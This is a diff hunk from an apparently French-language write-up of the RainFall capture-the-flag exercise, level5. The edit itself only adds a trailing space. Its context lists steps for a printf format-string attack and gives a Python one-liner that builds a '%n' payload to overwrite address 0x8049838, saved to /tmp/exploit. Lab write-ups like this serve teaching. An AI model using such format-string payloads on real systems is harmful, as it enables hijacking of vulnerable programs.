@@ -84,7 +84,7 @@ En utilisant la même methode qu'aux level3 et level4 (cf):
 	3. Injectez notre adresse 0x8049838 dans le buffer de printf()
 	4. Ecrire dans 0x8049838
 	
-On peut alors monter l'exploit suivante :
+On peut alors monter l'exploit suivante : 
 
 $>level5@RainFall:~$ python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' > /tmp/exploit
 
